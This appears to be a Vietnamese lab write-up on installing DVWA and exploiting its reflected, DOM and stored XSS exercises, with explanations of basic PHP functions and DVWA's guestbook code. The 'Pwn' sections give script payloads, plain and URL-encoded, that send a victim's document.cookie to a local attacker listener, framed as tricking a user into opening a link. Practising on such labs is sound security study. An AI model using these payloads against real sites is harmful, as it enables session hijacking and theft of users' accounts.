# Install DVWA on Ubuntu
[Kali](https://www.youtube.com/watch?v=GmWQ1VIjd2U&list=PLHUKi1UlEgOJLPSFZaFKMoexpM6qhOb4Q&ab_channel=CryptoCat)
[Ubuntu](https://www.youtube.com/watch?v=kMUdmmTL7OM&ab_channel=gp_sec)
> Install PHP & Apache2 & mysql
> www-data user

# XSS Reflected
## What?
Lợi dụng lỗ hổng từ server hoặc client, hacker sẽ gửi link url chứa mã độc cho user. Khi user nhập link url chứa <br>
mã độc, hacker có thể tận dụng lấy session id của user.

## How?
### Low level
![image](https://github.com/user-attachments/assets/fdf93f3b-71f3-4570-be23-e80618d17bc5)

*Đầu tiên khi vào OWASP ta sẽ view source php*

> header() in php

1. Redirect to another page. <br>
```php
<?php
header("Location: https://www.example.com");  
exit; // Prevent further code execution 
?>
```
Nó sẽ gửi  request 'chuyển tiếp' đến server. Yêu cầu server phải đưa cho nó cái link trên. Dùng exit để đảm bảo ko <br>
có câu lệnh nào chèn thêm. <br>
2. Tránh caching
  
```php
<?php
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
?>  
```
> Caching là gì?

Lưu lại những cái hoạt động thường xuyên của user để tăng tốc độ truy cập web. Cải thiện performance, giảm load on <br>
backend sys, database...

Ví dụ ở trên cho ta biết đó là loại Browser-caching, nó sẽ gia hạn cho resources được phép tồn tại bao lâu. Ngoài ra, <br>
mik còn 1 số loại caching như: Server side caching, CDN caching, Application Level caching... Bên cạnh đó đi kèm đó chính là <br>
những stragegy để caching (sẽ tìm hiểu sau)

> $GET

Siêu biến toàn cục (super global variable) dùng để lấy dữ liệu đc gửi qua URL thông qua phương thức GET

Example:
```http://example.com/index.php?name=Hung&age=30```

Ở đây mình sẽ sử dụng $GET để lấy name và age <br>

```php
<?php
$name = $_GET['name']; // "Hung"
$age = $_GET['age'];   // "30"

echo "Name: " . $name . "<br>";
echo "Age: " . $age;
?>
```

> array_key_exists(key, var)

Kiểm tra có tồn tại khóa *key* ở trong dãy *var* không?

## Pwn Time
1. Tạo 1 local host port 8000 = python3

![image](https://github.com/user-attachments/assets/340be4e7-2977-4853-b900-be0bea77fe46)

2. Mik sẽ chạy javascript trong input box, lúc đó biến 'name' = malicious code.
```
<script>window.location='http://127.0.0.1:8000/?cookie=' + document.cookie</script>
```
3. Kết quả

![image](https://github.com/user-attachments/assets/206feb0f-cedc-40aa-9c1a-80c09e8c0baa)

*Session id của user sẽ được gửi về terminal của attacker*

# XSS DOM
## Client / Server side
## Pwned Time
![image](https://github.com/user-attachments/assets/2b6ebd0c-6c76-4903-9305-b13b16b73757)
*Mình sẽ khai thác XSS trực tiếp trên client-side khác với XSS reflected khai thác qua server-side*

![image](https://github.com/user-attachments/assets/b5823528-483f-4285-a890-82c4ebb2de35)
*Thử nhập 1 lệnh alert*
--> Kết quả:
![image](https://github.com/user-attachments/assets/752634e3-7aba-43c7-945d-07c6b05c5136)

Pwn time:
1. Tạo 1 local server qua python (port 8000)
![image](https://github.com/user-attachments/assets/6a79af35-58fe-4de8-b9d7-77fb0ad444a4)

2. Tạo payload độc, lừa user nhập vào
Payload gốc:
```
127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English<script>window.location='http://127.0.0.1:8000/?cookie=' + document.cookie</script>
```
![image](https://github.com/user-attachments/assets/ee01b5a4-71a4-48cf-b0db-9b04016eaefc)
*Nó sẽ ra 1 trang ntn*

Encode payload:
```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F127.0.0.1%3A8000%2F%3Fcookie%3Ddocument.cookie%3C%2Fscript%3E
```
3. Kết quả
Session id của người dùng hiện trong cửa sổ server của attacker
 ![image](https://github.com/user-attachments/assets/71026905-c57d-471c-81db-891455ac4e22)

# XSS Stored
## Image
![image](https://github.com/user-attachments/assets/c082869d-0917-47e3-8969-bf88766aff00)

## Code backend
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```
*Bảo vệ phần message và name khỏi sql injections. Sau đó thêm vào bảng sql 2 elements message và name*

> $_POST

Tương tự như $_GET, là 1 super global variable, nó sẽ collect những data được gửi đi bởi HTTP POST method <br>
Những data này có thể collect từ form fields: input, checkbox, radio, buttons,...
> trim()

Xóa đi những khoảng trống ở phần đầu.
> stripslashes()

Xóa đi back_slash (\) from a string. Ở trong những bản cũ của php, nó sẽ tự động thêm back slash vào những special character: ', " <br>
Việc của mik cần là xóa những cái đó đi để clean string.

> $_GLOBALS

include POST and GET
> isset(var)

1 Biến để check xem var đc tạo chưa? Not null -> true. Null -> false

## Pwn
![image](https://github.com/user-attachments/assets/3d4f5a68-756a-42f5-a3e9-d4191d4d92c1)
*Chỉnh max size = 250 và nhập malicious code*

-->kết quả:
![image](https://github.com/user-attachments/assets/4af0f7d5-9d17-4c01-94de-058e499fab6d)
*Mỗi lần load lại nó sẽ tự động ra cái trang này*





